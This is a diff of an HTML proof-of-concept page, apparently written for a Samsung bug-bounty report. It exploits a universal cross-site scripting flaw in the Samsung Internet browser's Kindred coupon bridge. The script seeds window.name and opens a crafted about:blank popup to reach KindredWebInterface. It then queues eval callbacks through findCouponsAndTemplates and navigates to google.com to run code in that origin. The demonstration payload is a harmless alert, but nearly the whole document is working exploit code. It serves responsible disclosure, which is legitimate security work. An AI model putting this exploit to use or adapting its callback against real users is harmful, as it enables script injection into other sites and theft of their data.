@@ -1,94 +1,119 @@
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Kindred UXSS variant (iframe + direct-eval)</title>
-<style>
- body{max-width:760px;margin:24px auto;padding:0 16px;font:15px/1.5 system-ui,sans-serif}
- button{padding:12px 18px;font:inherit;font-weight:650;width:100%;margin:6px 0}
- input{width:100%;padding:9px;font:inherit;border:1px solid #ccc;border-radius:6px;margin:4px 0}
- pre{min-height:14em;padding:12px;white-space:pre-wrap;overflow-wrap:anywhere;background:#f3f4f6;font-size:12px}
- .warn{color:#b23;font-size:12px}
- iframe{display:none}
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Samsung Kindred UXSS — variant (direct-eval callback, benign)</title>
+  <style>
+    body { max-width: 760px; margin: 40px auto; padding: 0 20px; font: 16px/1.5 system-ui, sans-serif; }
+    button { padding: 12px 18px; font: inherit; font-weight: 650; width:100%; margin:6px 0; }
+    pre { min-height: 12em; padding: 14px; overflow-wrap: anywhere; white-space: pre-wrap; background: #f3f4f6; }
+    .warn{color:#b23;font-size:12px}
+  </style>
 </head>
 <body>
-<h1>Kindred UXSS — variant: iframe delivery + direct-eval callback (benign)</h1>
-<p class="warn">Benign. Proof via alert(document.domain) only; no defacement, no data theft. Own build. Samsung Mobile Security Rewards.</p>
+  <main id="main">
+    <h1>Samsung Kindred UXSS — variant</h1>
+    <p class="warn">Benign: proof is alert(document.domain) only. No defacement, no data theft. Own build. Samsung Mobile Security Rewards.</p>
+    <button id="runDirect" type="button">A · run with DIRECT-EVAL callback: alert(document.domain)</button>
+    <button id="runName" type="button">fallback · run with callback: window.name.toString</button>
+    <pre id="log" aria-live="polite"></pre>
+  </main>
 
-<p>bypass URL</p><input id="trig" value="about:blank#kindred-probe://amazon.com/">
-<p>victim origin (your logic: google.com)</p><input id="victim" value="https://www.google.com/">
-<p>callback payload (A = direct eval; leave as-is to test eval semantics)</p>
-<input id="cb" value="alert(document.domain)">
-<p>delivery</p>
-<button onclick="go('iframe')">B · run via IFRAME (no popup block)</button>
-<button onclick="go('popup')">run via POPUP (fallback)</button>
-<pre id="log"></pre>
+  <script>
+  (() => {
+    'use strict';
 
-<iframe id="f"></iframe>
+    const params = new URLSearchParams(location.search);
+    if (params.has('bootstrap')) {
+      document.querySelector('#main').innerHTML =
+        '<h1>Attacker bootstrap document</h1><p>Waiting for the parent controller.</p>';
+      return;
+    }
 
-<script>
-(() => {
-'use strict';
-const params=new URLSearchParams(location.search);
-if(params.has('bootstrap')){ document.body.innerHTML='<h1>bootstrap</h1>'; return; }
-const out=document.getElementById('log');
-function log(m){ const t=new Date().toISOString().slice(11,23); out.textContent+=`[${t}] ${m}\n`; }
-const vm=/SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
-log('SamsungBrowser='+(vm?vm[1]:'NOT DETECTED'));
+    const output = document.querySelector('#log');
+    const runDirect = document.querySelector('#runDirect');
+    const runName = document.querySelector('#runName');
+    let running = false;
 
-// window.name payload still seeded, so callback='window.name.toString' path also works if direct-eval doesn't
-const NAMEPAYLOAD='<scr'+'ipt>alert("BENIGN UXSS — ran as "+document.domain);</scr'+'ipt>';
+    function log(message) {
+      const stamp = new Date().toISOString().slice(11, 23);
+      output.textContent += `[${stamp}] ${message}\n`;
+    }
 
-function val(id,d){ const v=document.getElementById(id).value; return (v&&v.trim())||d; }
+    const vm = /SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
+    log('SamsungBrowser=' + (vm ? vm[1] : 'NOT DETECTED — open in Samsung Internet'));
 
-function go(mode){
-  const trig=val('trig','about:blank#kindred-probe://amazon.com/');
-  const victim=val('victim','https://www.google.com/');
-  const cb=val('cb','alert(document.domain)');
-  log(`--- run mode=${mode} callback="${cb}" ---`);
+    function bootstrapUrl() {
+      const url = new URL(location.href);
+      url.searchParams.set('bootstrap', String(Date.now()));
+      url.hash = 'attacker-bootstrap';
+      return url.href;
+    }
 
-  let win, setSrc, reload;
-  if(mode==='iframe'){
-    const f=document.getElementById('f');
-    setSrc=(u)=>{ f.src=u; }; reload=()=>{ try{f.contentWindow.location.reload();}catch(e){ f.src=f.src; } };
-    setSrc(trig);
-    setTimeout(()=>{ win=f.contentWindow; try{ win.name=NAMEPAYLOAD; }catch(e){} log('iframe set to bypass URL; name seeded'); afterLoad(()=>f.contentWindow, (u)=>{f.src=u;}, reload, victim, cb); }
-, 300);
-  } else {
-    const p=open(location.href.split('#')[0].split('?')[0]+'?bootstrap='+Date.now(),'_blank');
-    if(!p){ log('popup blocked'); return; }
-    try{ p.name=NAMEPAYLOAD; }catch(e){}
-    setTimeout(()=>{ try{p.location.replace(trig);}catch(e){log('nav err '+e);} log('popup set to bypass URL; name seeded'); afterLoad(()=>p, (u)=>{try{p.location.replace(u);}catch(e){}}, ()=>{try{
-p.location.reload();}catch(e){}}, victim, cb); }, 300);
-  }
-}
+    // BENIGN payload (was PWNED defacement). For the window.name.toString path.
+    const PAYLOAD = '<scr' + 'ipt>alert("BENIGN UXSS — ran as "+document.domain);</scr' + 'ipt>';
 
-function afterLoad(getWin, navTo, reload, victim, cb){
-  setTimeout(reload, 1500);              // materialize bridge
-  const t0=performance.now();
-  const poll=setInterval(()=>{
-    const dt=Math.round(performance.now()-t0);
-    if(dt>20000){ clearInterval(poll); log('GATE1 TIMEOUT: KindredWebInterface never appeared (feature off / bypass rejected / renamed in this version)'); return; }
-    let w; try{ w=getWin(); }catch(e){ return; }
-    try{
-      for(const k in w){ if(/kindred|coupon|shop|samsung|sbrowser/i.test(k)) { /*hint*/ } }
-      if(typeof w.KindredWebInterface==='undefined') return;
-      clearInterval(poll);
-      const methods=[]; try{ for(const k in w.KindredWebInterface) methods.push(k); }catch(e){}
-      log('GATE1 ok @+'+dt+'ms. bridge methods: '+(methods.join(', ')||'(none)'));
-      try{ log('GATE2 isCheckoutPage("amazon.com")='+w.KindredWebInterface.isCheckoutPage('amazon.com')); }catch(e){ log('GATE2 FAIL '+e); }
-      try{
-        for(let i=0;i<10;i++) w.KindredWebInterface.findCouponsAndTemplates(`d-${Date.now()}-${i}.amazon.com`,'',cb,1);
-        w.KindredWebInterface.findCouponsAndTemplates('amazon.com','',cb,1);
-        log('GATE3 queued callback="'+cb+'" x11');
-      }catch(e){ log('GATE3 FAIL '+e); return; }
-      navTo(victim);
-      log('GATE4 navigated to '+victim+'. If alert "ran as '+ (victim.replace(/^https?:\/\//,'').replace(/\/.*/,'')) +'" fires => UXSS. (iframe: alert still pops from the frame context.)');
-    }catch(e){ clearInterval(poll); log('poll err '+e); }
-  },100);
-}
-})();
-</script>
+    function run(cb) {
+      if (running) return;
+
+      const popup = open(bootstrapUrl(), '_blank');
+      if (!popup) { log('popup blocked; tap the button for the reliable path'); return; }
+
+      running = true;
+      runDirect.disabled = runName.disabled = true;
+      log('popup opened; callback="' + cb + '"');
+
+      popup.name = PAYLOAD;
+      log('seeded window.name with benign domain-proof payload');
+
+      setTimeout(() => {
+        try { popup.location.replace('about:blank#kindred-probe://amazon.com/'); log('navigated popup to parser-confused inherited about:blank'); }
+        catch (error) { log(`about:blank navigation failed: ${error}`); }
+      }, 750);
+
+      setTimeout(() => {
+        try { popup.location.reload(); log('reloaded crafted about:blank to materialize KindredWebInterface'); }
+        catch (error) { log(`reload failed: ${error}`); }
+      }, 2000);
+
+      const started = performance.now();
+      const poll = setInterval(() => {
+        if (performance.now() - started > 20000) {
+          clearInterval(poll); running = false; runDirect.disabled = runName.disabled = false;
+          log('timed out waiting for KindredWebInterface');
+          return;
+        }
+        try {
+          if (typeof popup.KindredWebInterface === 'undefined') return;
+          clearInterval(poll);
+          log('KindredWebInterface acquired in attacker-origin document');
+
+          // enumerate once so renamed methods / other sinks are visible
+          try { const ms=[]; for (const k in popup.KindredWebInterface) ms.push(k); log('bridge methods: '+(ms.join(', ')||'(none enumerable)')); } catch(e){}
+
+          const guardProof = popup.KindredWebInterface.isCheckoutPage('amazon.com');
+          log(`guarded bridge method executed; result=${guardProof}`);
+
+          for (let i = 0; i < 10; i++) {
+            popup.KindredWebInterface.findCouponsAndTemplates(`uxss-delay-${Date.now()}-${i}.amazon.com`, '', cb, 1);
+          }
+          popup.KindredWebInterface.findCouponsAndTemplates('amazon.com', '', cb, 1);
+          log(`queued findCouponsAndTemplates callback="${cb}"`);
+
+          popup.location.replace('https://www.google.com/');
+          log('navigated popup to unmodified https://www.google.com/ — if UXSS fires you get alert "ran as www.google.com"');
+          running = false; runDirect.disabled = runName.disabled = false;
+        } catch (error) {
+          clearInterval(poll); running = false; runDirect.disabled = runName.disabled = false;
+          log(`exploit setup failed: ${error}`);
+        }
+      }, 100);
+    }
+
+    runDirect.addEventListener('click', () => run('alert(document.domain)'));
+    runName.addEventListener('click', () => run('window.name.toString'));
+  })();
+  </script>
 </body>
 </html>
